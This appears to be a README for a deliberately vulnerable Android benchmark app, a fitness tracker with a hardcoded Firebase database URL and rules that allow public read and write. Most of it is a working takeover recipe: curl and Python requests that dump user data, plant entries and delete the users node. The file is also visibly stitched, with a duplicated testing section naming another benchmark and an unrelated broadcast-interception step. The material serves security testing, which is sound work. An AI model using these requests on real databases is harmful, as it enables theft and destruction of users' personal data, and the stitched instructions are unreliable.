# oxo-android-ben58: Firebase Database Takeover

## Vulnerability Overview

Firebase Database Takeover occurs when Android applications expose Firebase Realtime Database URLs in their resources without proper security rules, allowing unauthorized public access to read and write sensitive data. This vulnerability enables complete database compromise through misconfigured Firebase access controls.

## Attack Vector: Misconfigured Firebase Database Access

**Brief Explanation**: A fitness tracking app that hardcodes Firebase database URLs in `strings.xml` with overly permissive security rules, allowing any attacker to directly access the database via HTTP requests without authentication, enabling complete data theft and manipulation.

**Key Characteristics:**
- Hardcoded Firebase database URL exposed in app resources
- Misconfigured security rules allowing public read/write access
- No authentication required to access sensitive user data
- Complete database takeover possible via simple HTTP requests

**Vulnerable Code Pattern:**
```xml
<!-- res/values/strings.xml - VULNERABLE: Exposed Firebase URL -->
<string name="firebase_database_url">https://fittracker-sync-backend-default-rtdb.firebaseio.com</string>
```

```kotlin
// VULNERABLE: Using hardcoded Firebase URL without proper security
val database = FirebaseDatabase.getInstance("https://fittracker-sync-backend-default-rtdb.firebaseio.com")
val usersRef = database.getReference("users")
usersRef.setValue(userData)  // VULNERABLE - Public write access!
```

```json
// VULNERABLE: Overly permissive Firebase security rules
{
  "rules": {
    ".read": true,
    ".write": true
  }
}
```

## Testing

### Step 1: Install and Launch FitTracker Pro
```bash
# Install the vulnerable fitness app
adb install -r /path/to/oxo-android-ben55/src/app/build/outputs/apk/debug/app-debug.apk

# Launch the app
adb shell am start -n co.ostorlab.myapplication/.MainActivity
```

## Testing

### Step 1: Install and Launch FitTracker Pro
```bash
# Install the vulnerable fitness app
adb install -r /path/to/oxo-android-ben58/src/app/build/outputs/apk/debug/app-debug.apk

# Launch the app
adb shell am start -n co.ostorlab.myapplication/.MainActivity
```

### Step 2: Extract Firebase Database URL
```bash
# Method 1: Extract from APK resources
aapt dump strings app-debug.apk | grep firebase

# Method 2: Decompile APK and check strings.xml
apktool d app-debug.apk
cat app-debug/res/values/strings.xml | grep firebase_database_url
```

### Step 3: Test Database Access
```bash
# Test public read access - view all data
curl "https://fittracker-sync-backend-default-rtdb.firebaseio.com/.json"

# Test public write access - modify data
curl -X PUT "https://fittracker-sync-backend-default-rtdb.firebaseio.com/exploit.json" 
  -d '{"message": "Database Compromised", "hacker": "Security Tester", "timestamp": "2025-08-28"}'

# Test data deletion - remove data
curl -X DELETE "https://fittracker-sync-backend-default-rtdb.firebaseio.com/users.json"
```

### Step 4: Verify Database Takeover
```bash
# Verify exploit was successful
curl "https://fittracker-sync-backend-default-rtdb.firebaseio.com/exploit.json"
```

### Step 3: Verify Network Data Interception
```bash
# Check broadcast history for intercepted network data
adb shell dumpsys activity broadcasts | sed -n '/Historical broadcasts summary/,/^$/p' | grep -A 5 "com.fittracker"
```

### Expected Results:
```json
{
  "users": {
    "user_001": {
      "name": "John Fitness",
      "email": "john@email.com",
      "password": "mySecretPass123",
      "workouts": [
        {"type": "running", "duration": 45, "calories": 320},
        {"type": "cycling", "duration": 60, "calories": 480}
      ],
      "personal_data": {
        "age": 28,
        "weight": 75,
        "height": 180,
        "medical_conditions": "None"
      }
    }
  },
  "device_data": {
    "device_001": {
      "mac_address": "AA:BB:CC:DD:EE:FF",
      "last_sync": "2025-08-28T10:30:00Z",
      "location": "40.7128,-74.0060"
    }
  },
  "exploit": {
    "message": "Database Compromised",
    "hacker": "Security Tester",
    "timestamp": "2025-08-28"
  }
}
```

## Impact Assessment
- **Confidentiality**: Critical - Complete exposure of user data, credentials, and personal information
- **Integrity**: Critical - Attackers can modify, delete, or corrupt all database content
- **Availability**: High - Database can be wiped or corrupted, causing service disruption
- **OWASP Mobile Top 10**: M2 - Insecure Data Storage, M4 - Insecure Communication, M10 - Extraneous Functionality
- **CWE**: CWE-200 (Information Exposure), CWE-522 (Insufficiently Protected Credentials), CWE-284 (Improper Access Control)

## Firebase Database Takeover Attack

An attacker can compromise the database through:

**Step 1: URL Discovery**
```bash
# Extract Firebase URL from APK
strings app-debug.apk | grep firebaseio.com
```

**Step 2: Database Reconnaissance**  
```bash
# Discover database structure
curl "https://fittracker-sync-backend-default-rtdb.firebaseio.com/.json?shallow=true"
```

**Step 3: Data Exfiltration**
```python
import requests

# Steal all user data
response = requests.get("https://fittracker-sync-backend-default-rtdb.firebaseio.com/users.json")
user_data = response.json()
print("Stolen user credentials:", user_data)
```

**Step 4: Data Manipulation**
```python
# Plant malicious data
malicious_data = {
    "exploit": "Database Compromised",
    "stolen_users": len(user_data),
    "timestamp": "2025-08-28T10:30:00Z"
}
requests.put("https://fittracker-sync-backend-default-rtdb.firebaseio.com/compromise.json", 
             json=malicious_data)
```

**Step 5: Data Destruction**
```bash
# Delete critical data
curl -X DELETE "https://fittracker-sync-backend-default-rtdb.firebaseio.com/users.json"
```

**Difficulty**: Easy - No authentication or special tools required

## Real-World Attack Scenarios

1. **Complete User Data Theft**: Access to fitness profiles, personal metrics, email addresses, and potentially passwords
2. **Corporate Espionage**: Stealing employee fitness data from corporate wellness programs  
3. **Identity Theft**: Using personal information for social engineering attacks
4. **Data Ransom**: Threatening to leak sensitive health data unless ransom is paid
5. **Competitive Intelligence**: Analyzing competitor's user base and usage patterns

**Example Attack Flow:**
```bash
# 1. Download target fitness app
# 2. Extract Firebase URL from APK resources  
# 3. Access database via direct HTTP requests
# 4. Exfiltrate all user data and personal information
# 5. Plant evidence of compromise or delete data
```

This vulnerability demonstrates how hardcoded Firebase URLs combined with misconfigured security rules can lead to complete database compromise without any authentication requirements.
